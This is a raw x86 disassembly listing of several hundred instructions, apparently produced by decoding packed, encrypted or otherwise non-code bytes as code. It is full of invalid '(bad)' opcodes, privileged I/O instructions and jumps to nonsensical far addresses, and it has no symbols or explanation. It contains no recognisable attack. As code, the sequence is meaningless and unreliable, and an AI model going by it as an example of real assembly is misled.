  41ea35:	dec    edx
  41ea36:	xchg   edi,eax
  41ea37:	cmp    cl,dl
  41ea39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea3a:	iret   
  41ea3b:	mov    eax,0x324ecc34
  41ea40:	fdiv   st(3),st
  41ea42:	xor    BYTE PTR [eax],0xa5
  41ea45:	test   BYTE PTR ds:[eax+0x4e7d1b19],bh
  41ea4c:	mov    ah,0x19
  41ea4e:	fdivr  QWORD PTR ds:0xb87069bd
  41ea54:	leave  
  41ea55:	jp     0x41ea52
  41ea57:	cmp    al,0xf9
  41ea59:	add    al,0x65
  41ea5b:	sub    eax,0x86b41fe9
  41ea60:	sub    edx,DWORD PTR [ebp+0x52]
  41ea63:	sbb    eax,0xe291cce3
  41ea68:	sbb    BYTE PTR [ebx+ebx*4+0x10],bl
  41ea6c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41ea6e:	adc    ah,BYTE PTR [esi]
  41ea70:	inc    ebx
  41ea71:	pop    ebp
  41ea72:	cmp    cl,BYTE PTR ds:0x3728d80d
  41ea78:	pop    ecx
  41ea79:	pop    esp
  41ea7a:	mov    eax,ds:0x5a70c4a4
  41ea7f:	cmp    DWORD PTR [esi],eax
  41ea81:	test   al,0x9c
  41ea83:	icebp  
  41ea84:	dec    esi
  41ea85:	inc    esp
  41ea86:	mov    ebp,0x8184f13f
  41ea8b:	jno    0x41eac1
  41ea8d:	push   0x4f6380e2
  41ea92:	and    BYTE PTR [eax+0x79b151e3],0x93
  41ea99:	jns    0x41ea26
  41ea9b:	loopne 0x41ea75
  41ea9d:	rcr    BYTE PTR ds:0x304caf4f,1
  41eaa3:	mov    ebx,0xeb27d926
  41eaa8:	jmp    0x41eb22
  41eaaa:	mov    bl,0x3b
  41eaac:	inc    esp
  41eaad:	imul   edi,DWORD PTR [edx],0x9e6e31df
  41eab3:	jno    0x41ea8a
  41eab5:	push   0x50c3fbe1
  41eaba:	les    edi,FWORD PTR [edx-0x26]
  41eabd:	sub    al,0x26
  41eabf:	sbb    eax,0xb4592633
  41eac4:	jb     0x41eacb
  41eac6:	fld    QWORD PTR [esi-0x4346b2dc]
  41eacc:	add    ch,ah
  41eace:	or     BYTE PTR [esi],ah
  41ead0:	call   0xfadb1885
  41ead5:	clc    
  41ead6:	add    eax,0xe5381810
  41eadb:	mov    edx,0x4a192975
  41eae0:	inc    esp
  41eae1:	mov    ds,WORD PTR [eax]
  41eae3:	lds    esi,FWORD PTR [esi-0x51]
  41eae6:	xchg   ebp,eax
  41eae7:	test   eax,0x5a5166a7
  41eaec:	and    BYTE PTR ds:0x2feaf421,bh
  41eaf2:	sub    DWORD PTR [ecx+0x6b70f00c],0x3d
  41eaf9:	aam    0x7e
  41eafb:	add    DWORD PTR [ebx+0x3e],0xff44bb90
  41eb02:	pusha  
  41eb03:	fistp  QWORD PTR [ebx+0x4f0a9c7f]
  41eb09:	stos   BYTE PTR es:[edi],al
  41eb0a:	sub    DWORD PTR [eax+0x31],ecx
  41eb0d:	(bad)  
  41eb0e:	inc    ebp
  41eb0f:	sbb    BYTE PTR [edx-0xc],ah
  41eb12:	(bad)  
  41eb13:	cli    
  41eb14:	mov    DWORD PTR [ecx],ecx
  41eb16:	das    
  41eb17:	mov    al,ds:0xe5562601
  41eb1c:	xchg   BYTE PTR [edi+0x6d246dea],bl
  41eb22:	jmp    0x4846d63b
  41eb27:	sar    DWORD PTR [ecx],cl
  41eb29:	or     dh,ah
  41eb2b:	clc    
  41eb2c:	jnp    0x41eb01
  41eb2e:	sbb    edi,DWORD PTR [ebx+0x106ace33]
  41eb34:	fsub   DWORD PTR [ebx+edx*8]
  41eb37:	pusha  
  41eb38:	ret    
  41eb39:	mov    ecx,0xc3b1992a
  41eb3e:	mov    DWORD PTR [edx],0x68eca165
  41eb44:	in     al,0x33
  41eb46:	xor    cl,BYTE PTR [eax+esi*4-0x63271d3f]
  41eb4d:	add    ecx,DWORD PTR [ecx+ecx*2]
  41eb50:	hlt    
  41eb51:	mov    cl,0x76
  41eb53:	sub    DWORD PTR ds:0xe3c89ce7,edx
  41eb59:	mov    edx,0xbf028e7e
  41eb5e:	or     ah,al
  41eb60:	leave  
  41eb61:	inc    edi
  41eb62:	adc    BYTE PTR [ecx+edx*4+0x48],dh
  41eb66:	push   0x5fd65add
  41eb6b:	sub    eax,0x63eb7899
  41eb70:	push   0x57
  41eb72:	xor    cl,BYTE PTR [eax]
  41eb74:	mov    al,0xe5
  41eb76:	pusha  
  41eb77:	jno    0x41eb0e
  41eb79:	lahf   
  41eb7a:	mov    dh,0xc9
  41eb7c:	dec    esp
  41eb7d:	add    dh,BYTE PTR [edi+ecx*2-0x56af18a1]
  41eb84:	test   esi,edi
  41eb86:	inc    edi
  41eb87:	into   
  41eb88:	pusha  
  41eb89:	mov    DWORD PTR [eax+0x6b],ecx
  41eb8c:	mov    ebx,0xa9babb6
  41eb91:	xchg   ebx,eax
  41eb92:	addr16 int 0xe6
  41eb95:	(bad)  [ecx-0x60]
  41eb98:	ins    BYTE PTR es:[edi],dx
  41eb99:	dec    eax
  41eb9a:	dec    edx
  41eb9b:	push   cs
  41eb9c:	loop   0x41eb52
  41eb9e:	push   ecx
  41eb9f:	pop    ds
  41eba0:	popf   
  41eba1:	pop    ebp
  41eba2:	jo     0x41ebb3
  41eba4:	fiadd  WORD PTR [ecx+0x3d358fd8]
  41ebaa:	cmc    
  41ebab:	loopne 0x41eb3e
  41ebad:	stc    
  41ebae:	(bad)  
  41ebaf:	mov    ds:0xa519f8cf,eax
  41ebb4:	cs push bx
  41ebb7:	dec    esp
  41ebb8:	in     al,0x91
  41ebba:	xchg   edi,eax
  41ebbb:	(bad)  [esi-0x46]
  41ebbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebbf:	xlat   BYTE PTR ds:[ebx]
  41ebc0:	sub    esp,ebp
  41ebc2:	mov    bh,BYTE PTR [edi+esi*8]
  41ebc5:	sbb    ch,0x1a
  41ebc8:	sbb    al,0x74
  41ebca:	push   esi
  41ebcb:	and    esp,0x71
  41ebce:	cmp    al,0xcb
  41ebd0:	popa   
  41ebd1:	sahf   
  41ebd2:	cmp    DWORD PTR [ebx+0x12],edx
  41ebd5:	stc    
  41ebd6:	xor    BYTE PTR [esi+eiz*2-0x6c],ch
  41ebda:	dec    eax
  41ebdb:	xchg   esi,eax
  41ebdc:	(bad)  
  41ebdd:	pop    edi
  41ebde:	dec    eax
  41ebdf:	adc    al,0xf4
  41ebe1:	xchg   esp,eax
  41ebe2:	pop    ecx
  41ebe3:	aaa    
  41ebe4:	repnz pop ss
  41ebe6:	(bad)  [edx-0x26ddf520]
  41ebec:	sahf   
  41ebed:	jg     0x41ebdb
  41ebef:	clc    
  41ebf0:	dec    eax
  41ebf1:	push   eax
  41ebf2:	ins    DWORD PTR es:[edi],dx
  41ebf3:	sub    dh,BYTE PTR ds:0xc8caeeb3
  41ebf9:	adc    al,0xc1
  41ebfb:	mov    al,0x4c
  41ebfd:	bndldx bnd0,[edi+ebx*4]
  41ec01:	sbb    DWORD PTR [edi-0x25],0x6ef6a3e4
  41ec08:	dec    ebp
  41ec09:	or     BYTE PTR [edx+eiz*2-0x21],0xe9
  41ec0e:	jg     0x41ec02
  41ec10:	ja     0x41ec40
  41ec12:	dec    edx
  41ec13:	push   edx
  41ec14:	call   0x8c5c:0x81c45dcb
  41ec1b:	pop    ds
  41ec1c:	inc    esp
  41ec1d:	mov    dh,0x49
  41ec1f:	call   0x9409:0x23590336
  41ec26:	dec    esp
  41ec27:	inc    esi
  41ec28:	ror    ebp,0xc9
  41ec2b:	fistp  QWORD PTR [eax+0x17]
  41ec2e:	daa    
  41ec2f:	cmc    
  41ec30:	loopne 0x41ebc8
  41ec32:	nop
  41ec33:	cmc    
  41ec34:	out    dx,al
  41ec35:	sbb    al,0x8f
  41ec37:	push   0x15
  41ec39:	mov    cl,BYTE PTR [edx-0x6c]
  41ec3c:	test   eax,0x3bf047d
  41ec41:	mov    edi,DWORD PTR [edx+edx*1]
  41ec44:	push   eax
  41ec45:	inc    esi
  41ec46:	pop    edi
  41ec47:	retf   
  41ec48:	fsubr  st,st(5)
  41ec4a:	mov    ebx,0x4e2a23e8
  41ec4f:	sbb    DWORD PTR [eax],ebx
  41ec51:	and    DWORD PTR [eax+0x2],esp
  41ec54:	mov    edi,0xa7111ba1
  41ec59:	out    dx,eax
  41ec5a:	aad    0x7
  41ec5c:	or     dh,BYTE PTR [eax+0x24]
  41ec5f:	cmc    
  41ec60:	mov    ebp,0x60e3353c
  41ec65:	cmp    bh,BYTE PTR ds:0x505f9bd
  41ec6b:	inc    eax
  41ec6c:	xor    ah,BYTE PTR [ecx]
  41ec6e:	and    bl,BYTE PTR [ecx]
  41ec70:	int    0xb3
  41ec72:	mov    bl,0xb7
  41ec74:	cmp    ah,ah
  41ec76:	ficom  DWORD PTR [esi]
  41ec78:	mov    BYTE PTR [eax+0x62],0xb9
  41ec7c:	cs arpl si,si
  41ec7f:	and    BYTE PTR [esi-0x9],0x76
  41ec83:	dec    esp
  41ec84:	xchg   edi,eax
  41ec85:	fild   QWORD PTR [eax+0x3a14cf8f]
  41ec8b:	mov    WORD PTR [ebp+0x4d],es
  41ec8e:	mov    esp,0x36bb85aa
  41ec93:	arpl   WORD PTR [ecx-0x42],di
  41ec96:	(bad)  
  41ec98:	mov    al,ch
  41ec9a:	push   eax
  41ec9b:	dec    ebx
  41ec9c:	pop    ds
  41ec9d:	fsubr  st,st(5)
  41ec9f:	adc    bh,cl
  41eca1:	and    DWORD PTR [edi],edi
  41eca3:	in     eax,0xf0
  41eca5:	js     0x41ec93
  41eca7:	neg    DWORD PTR [ebx+0x1c]
  41ecaa:	call   0xde56:0x3500309e
  41ecb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecb2:	pop    eax
  41ecb3:	(bad)  
  41ecb4:	jmp    0x1474:0x38cb3b8b
  41ecbb:	pop    es
  41ecbc:	mov    ah,0x4d
  41ecbe:	xor    eax,0x5fbea460
  41ecc3:	add    al,0x72
  41ecc5:	test   BYTE PTR [eax-0x4966ff43],ch
  41eccb:	mov    ds:0xcc3ef180,eax
  41ecd0:	std    
  41ecd1:	and    BYTE PTR [ecx],bl
  41ecd3:	fmul   st,st(4)
  41ecd5:	mov    ds:0x1f3644cc,al
  41ecda:	pop    ebx
  41ecdb:	das    
  41ecdc:	sahf   
  41ecdd:	clc    
  41ecde:	add    DWORD PTR [esi-0x54],edx
  41ece1:	sbb    DWORD PTR [ebp+0x6e],edi
  41ece4:	xor    edi,ecx
  41ece6:	jecxz  0x41ecf6
  41ece8:	call   0x7493:0x18b39e5c
  41ecef:	cmp    bl,BYTE PTR [ecx]
  41ecf1:	and    BYTE PTR [ebx-0x47],bh
  41ecf4:	push   ebp
  41ecf5:	cmc    
  41ecf6:	mov    DWORD PTR [edx+0x312f588c],esp
  41ecfc:	test   DWORD PTR [ecx],edi
  41ecfe:	inc    edx
  41ecff:	std    
  41ed00:	outs   dx,DWORD PTR ds:[esi]
  41ed01:	arpl   WORD PTR [esi+0x2f],ax
  41ed04:	cdq    
  41ed05:	in     eax,dx
  41ed06:	repnz and eax,0x96716556
  41ed0c:	push   ss
  41ed0d:	ficomp WORD PTR [edi+ebx*2-0x60a2f38]
  41ed14:	inc    edx
  41ed15:	mov    dl,0x2b
  41ed17:	rol    edi,0x87
  41ed1a:	aaa    
  41ed1b:	in     al,0xef
  41ed1d:	(bad)  
  41ed1e:	and    dh,BYTE PTR [ebp+0x52f47c37]
  41ed24:	dec    eax
  41ed25:	jmp    0x41eda3
  41ed27:	test   al,0x48
  41ed29:	into   
  41ed2a:	pop    eax
  41ed2b:	in     eax,0x39
  41ed2d:	iret   
  41ed2e:	pop    ds
  41ed2f:	mov    edi,DWORD PTR [ebp+eiz*8-0x66]
  41ed33:	jno    0x41ecd8
  41ed35:	add    BYTE PTR [eax+0x24],dl
  41ed38:	xor    eax,0xe3c668f5
  41ed3d:	sub    DWORD PTR [ecx+0x54d6d8c1],edx
  41ed43:	icebp  
  41ed44:	and    eax,0x72f406e0
  41ed49:	inc    BYTE PTR [ebx-0x1e]
  41ed4c:	pop    eax
  41ed4d:	pop    esi
  41ed4e:	push   esi
  41ed50:	dec    ebx
  41ed51:	int    0xc7
  41ed53:	cdq    
  41ed54:	fdiv   st,st(7)
  41ed56:	push   es
  41ed57:	cmp    eax,0xb873e7e9
  41ed5c:	dec    esp
  41ed5d:	cld    
  41ed5e:	pop    ds
  41ed5f:	mov    ecx,DWORD PTR [ebx+0x6fc7c952]
  41ed65:	fiadd  WORD PTR [ebx-0x74]
  41ed68:	pop    ss
  41ed69:	es push ds
  41ed6b:	or     eax,0xb1b70dab
  41ed70:	jp     0x41ede0
  41ed72:	loop   0x41ed42
  41ed74:	sub    BYTE PTR [esi-0x50e45eb2],ah
  41ed7a:	sar    BYTE PTR [ebx-0x4],1
  41ed7d:	add    DWORD PTR [edi-0x64],eax
  41ed80:	icebp  
  41ed81:	sub    eax,DWORD PTR [esi]
  41ed83:	add    BYTE PTR [esi+0x18],bh
  41ed86:	cmc    
  41ed87:	stos   DWORD PTR es:[edi],eax
  41ed88:	mov    esp,ebp
  41ed8a:	mov    cl,0x8e
  41ed8c:	rol    BYTE PTR [ebx],0x35
  41ed8f:	dec    ecx
  41ed90:	and    ah,ch
  41ed92:	shl    BYTE PTR [eax+ebp*4-0x5a],0xed
  41ed97:	xchg   edx,eax
  41ed98:	add    al,BYTE PTR [eax+0x4e]
  41ed9b:	or     ch,ah
  41ed9d:	jge    0x41ed6f
  41ed9f:	jno    0x41ed22
  41eda1:	xchg   esp,eax
  41eda2:	shl    BYTE PTR [ebx+0x37],0xc1
  41eda6:	stos   BYTE PTR es:[edi],al
  41eda7:	stos   DWORD PTR es:[edi],eax
  41eda8:	mov    edi,0xb5e810f3
  41edad:	sahf   
  41edae:	in     al,0xa4
  41edb0:	or     bl,BYTE PTR [ecx]
  41edb2:	jmp    0x41ed99
  41edb4:	or     edi,ecx
  41edb6:	test   BYTE PTR [ebx],0x9b
  41edb9:	mov    bl,0xa3
  41edbb:	out    0x9f,eax
  41edbd:	test   DWORD PTR [ebx-0x53],ebx
  41edc0:	xchg   edx,eax
  41edc1:	enter  0xcd44,0x8
  41edc5:	cwde   
  41edc6:	inc    esi
  41edc7:	rol    ebx,0x85
  41edca:	out    0x1e,al
  41edcc:	js     0x41eda3
  41edce:	test   eax,0x3ea82ac
  41edd3:	ret    0x3d94
  41edd6:	popf   
  41edd7:	lea    esp,[edx+0x39109863]
  41eddd:	lock adc bl,dl
  41ede0:	aas    
  41ede1:	imul   esp,DWORD PTR [edi-0x7a0bac04],0x69
  41ede8:	xchg   ecx,eax
  41ede9:	lods   al,BYTE PTR ds:[esi]
  41edea:	lahf   
  41edeb:	pusha  
  41edec:	leave  
  41eded:	sub    al,0xaa
  41edef:	in     eax,0x5d
  41edf1:	xchg   edi,eax
  41edf2:	pop    ebx
  41edf3:	or     dh,ah
  41edf5:	es cs xor dl,bl
  41edf9:	ins    BYTE PTR es:[edi],dx
  41edfa:	mov    al,0x1d
  41edfc:	or     edi,DWORD PTR [esi+0x2]
  41edff:	or     DWORD PTR ds:0x535a5291,esp
  41ee05:	icebp  
  41ee06:	out    0xbf,eax
  41ee08:	mov    al,0xaf
  41ee0a:	mov    BYTE PTR [eax+0xc2],bh
  41ee10:	add    BYTE PTR [eax],al
  41ee12:	push   edx
  41ee13:	push   ecx
  41ee14:	cmp    BYTE PTR [ebx],al
  41ee16:	cmp    ebp,DWORD PTR [ebx+0x7b]
  41ee19:	push   ecx
  41ee1a:	pop    edx
  41ee1b:	mov    ch,0xf5
  41ee1d:	lahf   
  41ee1e:	and    BYTE PTR [ebx+0x68f392c5],ah
  41ee24:	add    DWORD PTR [eax],eax
  41ee26:	repz add al,0x0
  41ee29:	add    BYTE PTR [edi],dl
  41ee2b:	mov    gs,WORD PTR [edi-0x646dd383]
  41ee31:	pop    esp
  41ee32:	mov    ch,0x0
  41ee34:	adc    al,0x76
  41ee36:	cmp    ah,BYTE PTR [edx]
  41ee38:	fs jns 0x41eea4
  41ee3b:	stos   DWORD PTR es:[edi],eax
  41ee3c:	dec    edi
  41ee3d:	add    BYTE PTR [ebp+0x16],cl
  41ee40:	mov    ch,0xc0
  41ee42:	fcom   DWORD PTR [esi+edx*8-0x4c]
  41ee46:	and    DWORD PTR [edx+0x50],ebx
  41ee49:	mov    bl,BYTE PTR [ebp+0x57cbac10]
  41ee4f:	ins    BYTE PTR es:[edi],dx
  41ee50:	mov    ecx,0x69a3f005
  41ee55:	int3   
  41ee56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee57:	shl    DWORD PTR [esi+ebx*8-0x3],0xa9
  41ee5c:	dec    esp
  41ee5d:	jmp    0x55f2:0x3de5aea3
  41ee64:	data16 mov BYTE PTR [edi],bh
  41ee67:	sbb    bl,BYTE PTR [eax-0x49abd5db]
  41ee6d:	xchg   edi,eax
  41ee6e:	ja     0x41ee56
  41ee70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee72:	ror    BYTE PTR [ebx],cl
  41ee74:	ret    
  41ee75:	(bad)  
  41ee76:	pop    ds
  41ee77:	mov    ah,0x66
  41ee79:	mov    edx,0x1d08bccf
  41ee7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee7f:	sub    eax,0xa6a14e61
  41ee84:	in     eax,0x37
  41ee86:	popa   
  41ee87:	mov    al,0xd6
  41ee89:	aam    0x95
  41ee8b:	push   edi
  41ee8c:	int    0x1f
  41ee8e:	push   edx
  41ee8f:	or     al,0x81
  41ee91:	mov    BYTE PTR [ecx+ebp*4-0x74],cl
  41ee95:	lea    ebp,[ebp+0x1c]
  41ee98:	repz adc BYTE PTR [esi+ebx*8+0x25fe9cc3],0x45
  41eea1:	not    DWORD PTR ds:0xf991fc22
  41eea7:	stc    
  41eea8:	jae    0x41ee47
  41eeaa:	mov    dh,0xbf
  41eeac:	mov    DWORD PTR [eax],esp
  41eeae:	mov    al,ds:0xee2406e6
  41eeb3:	inc    ebx
  41eeb4:	push   ebx
  41eeb5:	popf   
  41eeb6:	mov    edi,0xc2c644c9
  41eebb:	add    ecx,DWORD PTR [edx-0x55]
  41eebe:	mov    ds:0x8e756e0f,al
  41eec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eec4:	gs out dx,eax
  41eec6:	lods   al,BYTE PTR ds:[esi]
  41eec7:	add    BYTE PTR [edi-0x16],bl
  41eeca:	dec    ecx
  41eecb:	xlat   BYTE PTR ds:[ebx]
  41eecc:	mov    edi,0x636c4906
  41eed1:	add    al,0xe6
  41eed3:	scas   al,BYTE PTR es:[edi]
  41eed4:	retf   
  41eed5:	dec    ebp
  41eed6:	loop   0x41eef0
  41eed8:	inc    ebp
  41eed9:	jns    0x41eeb3
  41eedb:	enter  0x625c,0x2a
  41eedf:	mov    gs,WORD PTR [edi]
  41eee1:	int3   
  41eee2:	mov    esi,0xafbac520
  41eee7:	imul   ecx,DWORD PTR [esp+edi*4-0x1d],0x25d3e286
  41eeef:	clc    
  41eef0:	fs add al,0xfa
  41eef3:	popa   
  41eef4:	into   
  41eef5:	cmp    DWORD PTR [edi],ebx
  41eef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eef8:	push   es
  41eef9:	dec    eax
  41eefa:	push   0xffffff88
  41eefc:	into   
  41eefd:	mov    esp,0x3f3d21be
  41ef02:	clc    
  41ef03:	popa   
  41ef04:	rol    eax,0xb6
  41ef07:	sti    
  41ef08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef09:	call   0x9ae7:0x39de32a1
  41ef10:	mov    eax,?
  41ef12:	clc    
  41ef13:	sub    eax,0x7e7c9209
  41ef18:	stos   DWORD PTR es:[edi],eax
  41ef19:	jg     0x41ef37
  41ef1b:	(bad)  
  41ef1c:	or     eax,DWORD PTR [edx+0x24700108]
  41ef22:	(bad)  
  41ef23:	jge    0x41ef3c
  41ef25:	push   es
  41ef26:	or     al,0x1a
  41ef28:	cmc    
  41ef29:	push   esp
  41ef2a:	sub    DWORD PTR [eax],edi
  41ef2c:	div    DWORD PTR [eax+0x4c831a97]
  41ef32:	sub    al,0xce
  41ef34:	mov    ecx,0x15ed1c69
  41ef39:	fstp   QWORD PTR [ebx-0x6e22a849]
  41ef3f:	dec    esi
  41ef40:	mov    ebx,0x8e82b7bd
  41ef45:	adc    BYTE PTR [esi+0xa725d1d],dl
  41ef4b:	mov    bl,0xb3
  41ef4d:	ins    DWORD PTR es:[edi],dx
  41ef4e:	mov    ch,0x20
  41ef50:	push   ebx
  41ef51:	inc    ebx
  41ef52:	pop    ebp
  41ef53:	mov    DWORD PTR gs:0x2561a04c,ebp
  41ef5a:	test   al,0xbf
  41ef5c:	ins    BYTE PTR es:[edi],dx
  41ef5d:	jmp    0xa3bf3736
  41ef62:	enter  0xc0d2,0x4
  41ef66:	or     esp,DWORD PTR [ecx-0x32c18ef6]
  41ef6c:	rcr    DWORD PTR [edi+eiz*2-0x7d],0x6b
  41ef71:	mov    ch,0x5a
  41ef73:	push   ebp
  41ef74:	std    
  41ef75:	cs stos BYTE PTR es:[edi],al
  41ef77:	cmp    BYTE PTR [ebx+eiz*1+0x4e],bh
  41ef7b:	inc    edi
  41ef7c:	lock mov edi,0xda63788d
  41ef82:	out    0x25,al
  41ef84:	xchg   esi,eax
  41ef85:	(bad)  
  41ef86:	fcomp  DWORD PTR ds:0xa8a01ace
  41ef8c:	cdq    
  41ef8d:	stc    
  41ef8e:	lea    ebx,[eax]
  41ef90:	xchg   edx,eax
  41ef91:	adc    ebx,DWORD PTR [ebx-0x506ee2a0]
  41ef97:	repz mov al,ds:0x47f3af71
  41ef9d:	outs   dx,BYTE PTR ds:[esi]
  41ef9e:	pop    ecx
  41ef9f:	stos   DWORD PTR es:[edi],eax
  41efa0:	(bad)  
  41efa1:	arpl   bx,dx
  41efa3:	aad    0x40
  41efa5:	je     0x41ef6a
  41efa7:	outs   dx,DWORD PTR ds:[esi]
  41efa8:	cwde   
  41efa9:	pusha  
  41efaa:	jge    0x41f02a
  41efac:	push   eax
  41efad:	pop    ebp
  41efae:	fisttp QWORD PTR [edi]
  41efb0:	ja     0x41ef83
  41efb2:	jne    0x41efe7
  41efb4:	inc    ebp
  41efb5:	pop    ebp
  41efb6:	loope  0x41efcb
  41efb8:	cwde   
  41efb9:	or     al,0x1a
  41efbb:	mov    bh,0x21
  41efbd:	fstp   DWORD PTR [edx]
  41efbf:	mov    eax,0x3924b6fc
  41efc4:	mov    ecx,0xab82954b
  41efc9:	dec    ebx
  41efca:	push   edx
  41efcb:	mov    eax,DWORD PTR [eax+0x7848b174]
  41efd1:	es and eax,0x7a7fd529
  41efd7:	inc    esi
  41efd8:	rcl    bl,0x32
  41efdb:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41efdd:	adc    eax,0xddde1e6e
  41efe2:	push   es
  41efe3:	dec    esp
  41efe4:	xchg   DWORD PTR [edx-0x5e],esi
  41efe7:	sbb    BYTE PTR [edi-0x5c],bl
  41efea:	or     DWORD PTR [edi+0x1b],ecx
  41efed:	xor    BYTE PTR [esi+ebx*2+0x5c],dh
  41eff1:	lods   al,BYTE PTR ds:[esi]
  41eff2:	sti    
  41eff3:	ds int 0xfd
  41eff6:	xchg   cl,bl
  41eff8:	jnp    0x41f078
  41effa:	loop   0x41eff3
  41effc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41effd:	jo     0x41efcf
  41efff:	sub    edi,DWORD PTR [edi]
  41f001:	pextrw edi,mm3,0xa7
  41f005:	cmp    al,0x26
  41f007:	dec    eax
  41f008:	je     0x41efa4
  41f00a:	or     eax,0x50ff169a
  41f00f:	(bad)  
  41f010:	adc    dh,BYTE PTR [eax-0x27926826]
  41f016:	fst    DWORD PTR [ebp-0x7a]
  41f019:	xor    al,0x3d
  41f01b:	es in  al,0x12
  41f01e:	jl     0x41efea
  41f020:	inc    ah
  41f022:	(bad)
  41f025:	pop    es
  41f026:	push   esi
  41f027:	jo     0x41efe0
  41f029:	rcl    DWORD PTR ds:0xeb9e5804,0x21
  41f030:	jae    0x41f088
  41f032:	les    esi,FWORD PTR [ebp-0x6863dda0]
  41f038:	sub    eax,edx
  41f03a:	sub    DWORD PTR [ecx-0x8],0x77
  41f03e:	xchg   ebp,eax
  41f03f:	aaa    
  41f040:	mov    bh,0xed
  41f042:	(bad)  
  41f043:	aad    0xc4
  41f045:	mov    esp,0xac2729b3
  41f04a:	cmp    eax,0x5dace192
  41f04f:	xchg   DWORD PTR [edx+0x1c49d9e8],ebp
  41f055:	mov    edx,0xf56d7f40
  41f05a:	es push eax
  41f05c:	in     eax,dx
  41f05d:	jecxz  0x41f0af
  41f05f:	sti    
  41f060:	sub    al,0x8d
  41f062:	inc    eax
  41f063:	jmp    0x41f0d4
  41f065:	(bad)  
  41f066:	hlt    
  41f067:	ret    
  41f068:	mul    DWORD PTR ds:0x1469e482
  41f06e:	(bad)  
  41f06f:	cmp    edi,DWORD PTR [ebp-0x7395e98]
  41f075:	mov    esi,0x4ecdbd8c
  41f07a:	adc    eax,0xfd97077d
  41f07f:	leave  
  41f080:	shl    DWORD PTR [edx+0x1f],1
  41f083:	jl     0x41f0c8
  41f085:	adc    BYTE PTR fs:[ebx+0x56],bl
  41f089:	mov    bh,0x93
  41f08b:	popa   
  41f08c:	shl    BYTE PTR [edi+0x2a4f5979],cl
  41f092:	sbb    al,0x85
  41f094:	pop    edx
  41f095:	mov    bl,0x42
  41f097:	xlat   BYTE PTR ds:[ebx]
  41f098:	ins    DWORD PTR es:[edi],dx
  41f099:	outs   dx,BYTE PTR ds:[esi]
  41f09a:	add    DWORD PTR [ebx],eax
  41f09c:	mov    esi,es
  41f09e:	xor    BYTE PTR cs:[ebp-0x27],cl
  41f0a2:	sahf   
  41f0a3:	xor    DWORD PTR [ecx-0x56],esp
  41f0a6:	addr16 mov ebp,0x7596ec6
  41f0ac:	or     al,BYTE PTR [eax+0x6e]
  41f0af:	and    eax,0x2fbb833b
  41f0b4:	mov    ebp,0xc6c96093
  41f0b9:	mov    eax,ds:0xcd2266f2
  41f0be:	sub    eax,0xa04be34a
  41f0c3:	shr    DWORD PTR [edx-0x34],0xa0
  41f0c7:	sub    ebp,DWORD PTR [ebp+0x6b]
  41f0ca:	repnz mov esp,0x744423a1
  41f0d0:	sub    BYTE PTR [edi+0x52671bd6],ah
  41f0d6:	dec    ebp
  41f0d7:	push   ebp
  41f0d8:	push   ecx
  41f0d9:	mov    bh,0xa3
  41f0db:	xchg   esp,eax
  41f0dc:	xchg   BYTE PTR [ebp-0x521ad92],dl
  41f0e2:	xor    ch,ch
  41f0e4:	int3   
  41f0e5:	jb     0x41f0b7
  41f0e7:	inc    esi
  41f0e8:	(bad)  
  41f0ea:	imul   esp,DWORD PTR [edx+edx*1+0x57269bd],0x665f8334
  41f0f5:	pop    edi
  41f0f6:	mov    bl,0x6d
  41f0f8:	jb     0x41f0ab
  41f0fa:	mov    bh,ah
  41f0fc:	sar    DWORD PTR [edi+0x46121dfd],cl
  41f102:	ins    BYTE PTR es:[edi],dx
  41f103:	(bad)  
  41f104:	or     al,0x71
  41f106:	or     al,0xe3
  41f108:	jmp    0xda73:0xadc807c2
  41f10f:	popa   
  41f110:	and    BYTE PTR [ecx-0x66],al
  41f113:	out    dx,eax
  41f114:	hlt    
  41f115:	inc    edi
  41f116:	sbb    DWORD PTR [edi+0x68],ebx
  41f119:	pusha  
  41f11a:	cli    
  41f11b:	jle    0x41f0bb
  41f11d:	rcl    DWORD PTR [ecx],0xa
  41f120:	mov    ah,0x6f
  41f122:	cld    
  41f123:	cmp    al,0x2f
  41f125:	fist   DWORD PTR [esi]
  41f127:	shl    DWORD PTR [eax+eiz*4+0xb],cl
  41f12b:	push   esi
  41f12c:	or     BYTE PTR [edx-0x73],ch
  41f12f:	add    dl,BYTE PTR [esi-0x27]
  41f132:	jb     0x41f162
  41f134:	jnp    0x41f115
  41f136:	sbb    ah,BYTE PTR [edx+ebx*8+0x1b300fef]
  41f13d:	fcmovu st,st(6)
  41f13f:	mov    ebp,DWORD PTR [eax+edi*2]
  41f142:	test   BYTE PTR [ebx-0x3d2bdff0],al
  41f148:	push   ecx
  41f149:	jmp    0x41f15e
  41f14b:	cmp    DWORD PTR [ebx+ebx*2+0x2bb2983c],edx
  41f152:	(bad)  [edi-0x4e108e23]
  41f158:	retf   0xc527
  41f15b:	add    ah,BYTE PTR [esi-0x79]
  41f15e:	adc    edx,eax
  41f160:	or     DWORD PTR [edx-0x30fe9aa8],edx
  41f166:	push   ds
  41f167:	push   si
  41f169:	push   edx
  41f16a:	cwde   
  41f16b:	jl     0x41f1bb
  41f16d:	cmp    DWORD PTR [ebp+ebx*1-0x4973b6a2],edi
  41f174:	pop    ecx
  41f175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f176:	das    
  41f177:	pop    ds
  41f178:	xchg   DWORD PTR [esi-0x4f],eax
  41f17b:	push   0xffffffbd
  41f17d:	fidiv  DWORD PTR [esi+ebx*8-0x4904802b]
  41f184:	neg    DWORD PTR [edx+0x16c3307e]
  41f18a:	cs enter 0x848,0xd6
  41f18f:	push   es
  41f190:	popf   
  41f191:	scas   al,BYTE PTR es:[edi]
  41f192:	push   ds
  41f193:	(bad)  
  41f194:	pop    esp
  41f195:	loop   0x41f16e
  41f197:	jae    0x41f198
  41f199:	leave  
